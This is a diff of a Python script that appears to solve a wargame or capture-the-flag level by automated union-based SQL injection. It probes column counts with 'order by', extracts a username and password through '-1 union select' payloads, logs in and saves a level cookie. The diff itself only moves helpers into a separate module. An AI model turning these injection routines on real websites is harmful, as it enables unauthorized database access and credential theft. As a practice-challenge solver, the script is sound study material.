@@ -1,24 +1,7 @@
 #!/usr/bin/env python3
-import requests
-from requests.exceptions import HTTPError
 import difflib
-from bs4 import BeautifulSoup
-import re
 import pickle
-
-
-def get_request(url: str, param: dict, cook={}, method='get') -> str:
-    try:
-        response = (requests.get(url, params=param, cookies=cook)
-                    if method == 'get' else
-                    requests.post(url, data=param, cookies=cook))
-        response.raise_for_status()
-    except HTTPError as http_err:
-        print(f'HTTP error occurred: {http_err}')
-    except Exception as err:
-        print(f'Other error occurred: {err}')
-    else:
-        return response.text
+import tigers as tg
 
 
 def count_columns(url: str) -> int:
@@ -26,7 +9,7 @@ def count_columns(url: str) -> int:
     html_responce_1 = ''
     for i in range(1, max_columns):
         param = dict(cat=f"1 order by {i}")
-        html_responce_2 = get_request(url, param)
+        html_responce_2 = tg.get_request(url, param)
         for s in difflib.ndiff(html_responce_2, html_responce_1):
             if i > 1 and ('+' in s[0] or '-' in s[0]):
                 return i - 1
@@ -40,10 +23,10 @@ def find_visible_columns(url: str, base_name: str,
     list_of_visible = []
     param = dict(
         cat=f"-1 union select {','.join(list_of_columns)} from {base_name}")
-    html_responce = get_request(url, param)
+    html_responce = tg.get_request(url, param)
     # find differens
     param = dict(cat=f"-1")
-    html_base = get_request(url, param)
+    html_base = tg.get_request(url, param)
     for s in difflib.ndiff(html_responce, html_base):
         if s[0] == ' ':
             continue
@@ -66,7 +49,7 @@ def find_param(url: str, base_name: str, list_of_columns: list,
             list_of_columns[int(list_of_visible[i]) - 1] = f
         param = dict(
             cat=f"-1 union select {','.join(list_of_columns)} from {base_name}")
-        html_responce = get_request(url, param)
+        html_responce = tg.get_request(url, param)
         # find differens
         n = -1
         key = [''] * len(find)
@@ -82,13 +65,6 @@ def find_param(url: str, base_name: str, list_of_columns: list,
         # todo
         print('too small visible list')
         exit(1)
-
-
-def extract_pass(response: str) -> str:
-    soup = BeautifulSoup(response.replace('<b>', ''), 'html.parser')
-    print(soup.find_all(string=re.compile("flag")))
-    passw = soup.find(string=re.compile("password"))
-    return passw
 
 
 def main():
@@ -107,8 +83,8 @@ def main():
     print(keys)
 
     data = dict(user=keys[0], password=keys[1], login='Login')
-    response = get_request(url, data, method='post')
-    passw = extract_pass(response).replace(pass_r, '')
+    response = tg.get_request(url, data, method='post')
+    passw = tg.extract_pass(response).replace(pass_r, '')
     print('password:', passw)
 
     try:
@@ -116,14 +92,10 @@ def main():
             cooks = pickle.load(f)
         if ('level2login' not in cooks) or (cooks['level2login'] != passw):
             cooks['level2login'] = passw
+            tg.save_cookies(cooks)
     except:
         cooks = dict(level2login=passw)
-        try:
-            with open('cooks.pickle', 'wb') as f:
-                pickle.dump(cooks, f)
-        except:
-            print('can not write cookies')
-            exit(1)
+        tg.save_cookies(cooks)
 
 
 if __name__ == '__main__':
